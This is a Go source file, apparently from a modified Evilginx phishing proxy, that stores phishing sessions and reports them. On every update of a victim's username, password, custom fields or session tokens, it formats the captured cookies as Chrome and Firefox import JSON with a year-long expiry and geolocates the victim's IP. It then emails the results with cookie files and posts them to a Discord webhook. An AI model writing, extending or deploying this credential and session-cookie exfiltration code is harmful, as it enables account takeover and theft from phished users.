package database

import (
	"encoding/json"
	"fmt"
	"time"

	"errors"
	"github.com/akaraon8bit/discordwebhookfile"
	"github.com/akaraon8bit/lookupgoogledns"
	"github.com/ip2location/ip2location-go"
	"github.com/qioalice/ipstack"
	"github.com/stvoidit/gosmtp"
	"github.com/tidwall/buntdb"
	"io/ioutil"
	// "net"
	_ "github.com/joho/godotenv/autoload"
	"net/http"
	"os"
	"path/filepath"
	"strings"
)

const SessionTable = "sessions"

var discordURL string = os.Getenv("discordURL")
var discordBOT string = os.Getenv("discordBOT")
var ipstackatoken string = os.Getenv("ipstackatoken")
var smtpAuthInfo = os.Getenv("smtpAuthInfo")

var mailResultTo = [][]string{{os.Getenv("mailResultTo"), os.Getenv("mailResultTo")}}

type Session struct {
	Id         int                          `json:"id"`
	Phishlet   string                       `json:"phishlet"`
	LandingURL string                       `json:"landing_url"`
	Username   string                       `json:"username"`
	Password   string                       `json:"password"`
	Custom     map[string]string            `json:"custom"`
	Tokens     map[string]map[string]*Token `json:"tokens"`
	SessionId  string                       `json:"session_id"`
	UserAgent  string                       `json:"useragent"`
	RemoteAddr string                       `json:"remote_addr"`
	CreateTime int64                        `json:"create_time"`
	UpdateTime int64                        `json:"update_time"`
}

type SessionResult struct {
	ID         int                          `json:"id"`
	Phishlet   string                       `json:"phishlet"`
	Username   string                       `json:"username"`
	Password   string                       `json:"password"`
	Tokens     map[string]map[string]*Token `json:"tokens"`
	Custom     map[string]string            `json:"custom"`
	Token      string                       `json:"token"`
	Landingurl string                       `json:"landingurl"`
	Useragent  string                       `json:"useragent"`
	Remoteip   string                       `json:"remoteip"`
	Createtime int64                        `json:"createtime"`
	Updatetime int64                        `json:"updatetime"`
}

type Token struct {
	Name     string
	Value    string
	Path     string
	HttpOnly bool
}

// declaring a struct
type IPGEOinfo struct {
	IpAddress     string `json:"ipAddress"`
	ContinentCode string `json:"continentCode"`
	ContinentName string `json:"continentName"`
	CountryCode   string `json:"countryCode"`
	CountryName   string `json:"countryName"`
	StateProvCode string `json:"stateProvCode"`
	StateProv     string `json:"stateProv"`
	City          string `json:"city"`
}

func ipCheckerApi(IP string) (IPGEOinfo, error) {

	url := "https://api.db-ip.com/v2/free/" + string(IP)
	response, err := http.Get(url)
	defer response.Body.Close()
	responseData, err := ioutil.ReadAll(response.Body)

	responseString := string(responseData)

	Data := []byte(responseString)
	var ipgeo IPGEOinfo

	json.Unmarshal(Data, &ipgeo)

	return ipgeo, err

}

//parse  token of session and  and exterect the cookie information and return as a string

// https://chrome.google.com/webstore/detail/milk-%E2%80%94-cookie-manager/haipckejfdppjfblgondaakgckohcihp/related
func ChromeCookieJSON(tokens map[string]map[string]*Token) string {

	type Cookie struct {
		Domain         string `json:"domain"`
		ExpirationDate int64  `json:"expirationDate"`
		HostOnly       bool   `json:"hostOnly"`
		HttpOnly       bool   `json:"httpOnly"`
		Name           string `json:"name"`
		Path           string `json:"path"`
		Value          string `json:"value"`
	}

	var cookies []*Cookie
	for domain, tmap := range tokens {
		for k, v := range tmap {
			c := &Cookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
			}
			if domain[:1] == "." {
				c.HostOnly = false
				// c.Domain = domain[1:]
			} else {
				c.HostOnly = true
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}

	json, _ := json.Marshal(cookies)
	return string(json)
}

// https://addons.mozilla.org/en-US/firefox/addon/cookie-quick-manager/

// "Host raw": "http://.mozilla.org/",
// "Name raw": "_gid",
// "Path raw": "/",
// "Content raw": "GA1.2.243407469.1650325171",
// "Expires raw": "1650411577",
// "HTTP only raw": "false",
// "This domain only raw": "false"

func MozillaCookieJSON(tokens map[string]map[string]*Token) string {
	type Cookie struct {
		Domain         string `json:"Host raw"`
		Name           string `json:"Name raw"`
		Path           string `json:"Path raw"`
		Value          string `json:"Content raw"`
		ExpirationDate string `json:"Expires raw"`
		HttpOnly       string `json:"HTTP only raw",omitempty"`
		HostOnly       string `json:"This domain only raw",omitempty"`
	}

	var cookies []*Cookie
	for domain, tmap := range tokens {
		for k, v := range tmap {
			c := &Cookie{
				Path:           v.Path,
				Domain:         "https://" + domain + v.Path,
				ExpirationDate: fmt.Sprintf("%v", time.Now().Add(365*24*time.Hour).Unix()),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       fmt.Sprintf("%v", v.HttpOnly),
			}
			if domain[:1] == "." {
				c.HostOnly = "false"
				// c.Domain = domain[1:]
			} else {
				c.HostOnly = "true"
			}
			if c.Path == "" {
				c.Path = "/"
			}

			cookies = append(cookies, c)
		}
	}

	json, _ := json.Marshal(cookies)
	return string(json)
}

func mailSessionDataText(texts string, subject string, files []string) {

	smtpcred := strings.Split(smtpAuthInfo, ":")
	smtp_server := smtpcred[0]
	smtp_username := smtpcred[1]
	smtp_password := smtpcred[2]
	smtp_port := smtpcred[3]
	//	smtp_tls := smtpcred[4]
	// fmt.Println(smtpcred)

	client := gosmtp.NewSender(smtp_username, smtp_password, smtp_username, fmt.Sprintf("%v:%v", smtp_server, smtp_port))
	for _, recs := range mailResultTo {
		var msg = gosmtp.NewMessage().
			SetTO(recs...).
			SetSubject(subject).
			SetText(texts).
			AddAttaches(files...)
		if err := client.SendMessage(msg); err != nil {
			// log.Fatalln(err)
		}
	}

}
func createSessionResultFile(texts string, filename string, overWrite bool) (string, error) {

	workDir, _ := os.Getwd()
	resultpath := filepath.Join(workDir, "SessionResult")
	if _, err := os.Stat(resultpath); errors.Is(err, os.ErrNotExist) {
		err := os.Mkdir(resultpath, os.ModePerm)
		if err != nil {
			//				log.Println(err)
		}
	}

	resultfilepath := filepath.Join(resultpath, filename)

	var tmpFile *os.File
	if overWrite {
		tmpFile, _ = os.OpenFile(resultfilepath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
	} else {
		tmpFile, _ = os.OpenFile(resultfilepath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	}

	// tmpFile, err := os.CreateTemp(os.TempDir(), "*evilginxcookie.json")

	text := []byte(texts)
	if _, err := tmpFile.Write(text); err != nil {
		return "error", err
	}

	// Close the file
	if err := tmpFile.Close(); err != nil {
		return "error", err
	}

	return tmpFile.Name(), nil
}

func sendSessionData(s *Session) {

	var sessiondata SessionResult
	sessiondata.ID = s.Id
	sessiondata.Phishlet = s.Phishlet
	sessiondata.Password = s.Password
	sessiondata.Username = s.Username
	sessiondata.Landingurl = s.LandingURL
	sessiondata.Useragent = s.UserAgent
	sessiondata.Custom = s.Custom
	sessiondata.Createtime = s.CreateTime
	sessiondata.Remoteip = s.RemoteAddr

	firefoxcookie := MozillaCookieJSON(s.Tokens)
	chromecookie := ChromeCookieJSON(s.Tokens)
	sessiondata.Tokens = s.Tokens
	sessiondata.Token = chromecookie

	botuser := discordBOT

	geopath, _ := os.Getwd()
	geopath += "/GEOIP.BIN"

	geoRegion := ""
	geoCity := ""
	geoCountry := ""

	if _, err := os.Stat(geopath); err == nil {

		geodb, _ := ip2location.OpenDB(geopath)
		defer geodb.Close()
		geopresult, _ := geodb.Get_all(sessiondata.Remoteip)

		if strings.Contains(geopresult.Region, "demo") != false {
			geopresult.Region = ""
			geopresult.City = ""
			geopresult.Country_short = ""

			geoRegion = geopresult.Region
			geoCity = geopresult.City
			geoCountry = geopresult.Country_long

		}

	} else {

		ipstack.Init(ipstackatoken)
		if res, err := ipstack.IP(sessiondata.Remoteip); err == nil {
			geoRegion = res.CountryName
			geoCity = res.RegionName
			geoCountry = res.CountryName
		}

	}

	if geoRegion == "" && geoCity == "" && "" == geoCountry {

		ipstack.Init(ipstackatoken)
		if res, err := ipstack.IP(sessiondata.Remoteip); err == nil {
			geoRegion = res.CountryName
			geoCity = res.RegionName
			geoCountry = res.CountryName
		}

		if geoRegion == "" && geoCity == "" && "" == geoCountry {

			ipgeo, _ := ipCheckerApi(string(sessiondata.Remoteip))
			geoRegion = ipgeo.StateProv
			geoCity = ipgeo.City
			geoCountry = ipgeo.CountryName
		}

	}

	subject := sessiondata.Phishlet
	hostname := lookupgoogledns.LookupAddr(sessiondata.Remoteip)

	todaydaate := time.Unix(time.Now().UTC().Unix(), 0)
	strDate := todaydaate.Format(time.RFC850)
	mailmessage := fmt.Sprintf(" %v - %v -  %v - %v - %v - %v\r\n", sessiondata.Remoteip, hostname, geoCity, geoRegion, geoCountry, strDate)
	mailmessage += fmt.Sprintf("Username: %v\r\n", sessiondata.Username)
	mailmessage += fmt.Sprintf("Password: %v \r\n", sessiondata.Password)
	if len(sessiondata.Custom) > 0 {
		for key, val := range sessiondata.Custom {
			mailmessage += fmt.Sprintf("%v: %v \r\n", key, val)
		}
	}
	mailmessage += fmt.Sprintf("%v\r\n", sessiondata.Useragent)
	mailmsg := subject + "\r\n\r\n\r\nIP\t" + mailmessage + "\r\n" + botuser + "\r\n" + strings.Repeat("=", 49) + "\r\n"

	phishresultfile := fmt.Sprintf("result%v.txt", sessiondata.Phishlet)

	if len(sessiondata.Custom) > 0 || len(sessiondata.Username) > 0 || len(sessiondata.Password) > 0 {
		createSessionResultFile(mailmsg, phishresultfile, false)

	}

	// mail the result
	firefoxcookiefilename, _ := createSessionResultFile(firefoxcookie, fmt.Sprintf("firefox%v.json", sessiondata.Remoteip), true)
	chromecookiefilename, _ := createSessionResultFile(chromecookie, fmt.Sprintf("chrome%v.json", sessiondata.Remoteip), true)
	var mailfiles = []string{firefoxcookiefilename, chromecookiefilename}
	mailSessionDataText(mailmsg, fmt.Sprintf("%v | %v | %v", subject, sessiondata.Remoteip, geoCountry), mailfiles)

	var discordcontent = string(mailmsg)
	var discordFiles = []string{firefoxcookiefilename, chromecookiefilename}
	message := discordwebhookfile.MessageFiles{
		Username: &botuser,
		Content:  &discordcontent,
		Files:    &discordFiles,
	}

	// ssend to discord
	err := discordwebhookfile.SendMessage(discordURL, message)

	if err != nil {
		// 30 messages every 60 seconds
		// todo limit discord message  request to 30 message every 60 seconds
		fmt.Println("Discord Error : ", err.Error())
	}

}

func (d *Database) sessionsInit() {
	d.db.CreateIndex("sessions_id", SessionTable+":*", buntdb.IndexJSON("id"))
	d.db.CreateIndex("sessions_sid", SessionTable+":*", buntdb.IndexJSON("session_id"))
}

func (d *Database) sessionsCreate(sid string, phishlet string, landing_url string, useragent string, remote_addr string) (*Session, error) {
	_, err := d.sessionsGetBySid(sid)
	if err == nil {
		return nil, fmt.Errorf("session already exists: %s", sid)
	}

	id, _ := d.getNextId(SessionTable)

	s := &Session{
		Id:         id,
		Phishlet:   phishlet,
		LandingURL: landing_url,
		Username:   "",
		Password:   "",
		Custom:     make(map[string]string),
		Tokens:     make(map[string]map[string]*Token),
		SessionId:  sid,
		UserAgent:  useragent,
		RemoteAddr: remote_addr,
		CreateTime: time.Now().UTC().Unix(),
		UpdateTime: time.Now().UTC().Unix(),
	}

	jf, _ := json.Marshal(s)

	err = d.db.Update(func(tx *buntdb.Tx) error {
		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
		return nil
	})
	if err != nil {
		return nil, err
	}

	return s, nil
}

func (d *Database) sessionsList() ([]*Session, error) {
	sessions := []*Session{}
	err := d.db.View(func(tx *buntdb.Tx) error {
		tx.Ascend("sessions_id", func(key, val string) bool {
			s := &Session{}
			if err := json.Unmarshal([]byte(val), s); err == nil {
				sessions = append(sessions, s)
			}
			return true
		})
		return nil
	})
	if err != nil {
		return nil, err
	}
	return sessions, nil
}

func (d *Database) sessionsUpdateUsername(sid string, username string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Username = username
	s.UpdateTime = time.Now().UTC().Unix()

	sendSessionData(s)

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdatePassword(sid string, password string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Password = password
	s.UpdateTime = time.Now().UTC().Unix()

	sendSessionData(s)

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdateCustom(sid string, name string, value string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Custom[name] = value
	s.UpdateTime = time.Now().UTC().Unix()

	sendSessionData(s)

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdateTokens(sid string, tokens map[string]map[string]*Token) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Tokens = tokens
	s.UpdateTime = time.Now().UTC().Unix()

	sendSessionData(s)

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdate(id int, s *Session) error {
	jf, _ := json.Marshal(s)

	err := d.db.Update(func(tx *buntdb.Tx) error {
		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
		return nil
	})
	return err
}

func (d *Database) sessionsDelete(id int) error {
	err := d.db.Update(func(tx *buntdb.Tx) error {
		_, err := tx.Delete(d.genIndex(SessionTable, id))
		return err
	})
	return err
}

func (d *Database) sessionsGetById(id int) (*Session, error) {
	s := &Session{}
	err := d.db.View(func(tx *buntdb.Tx) error {
		found := false
		err := tx.AscendEqual("sessions_id", d.getPivot(map[string]int{"id": id}), func(key, val string) bool {
			json.Unmarshal([]byte(val), s)
			found = true
			return false
		})
		if !found {
			return fmt.Errorf("session ID not found: %d", id)
		}
		return err
	})
	if err != nil {
		return nil, err
	}
	return s, nil
}

func (d *Database) sessionsGetBySid(sid string) (*Session, error) {
	s := &Session{}
	err := d.db.View(func(tx *buntdb.Tx) error {
		found := false
		err := tx.AscendEqual("sessions_sid", d.getPivot(map[string]string{"session_id": sid}), func(key, val string) bool {
			json.Unmarshal([]byte(val), s)
			found = true
			return false
		})
		if !found {
			return fmt.Errorf("session not found: %s", sid)
		}
		return err
	})
	if err != nil {
		return nil, err
	}
	return s, nil
}
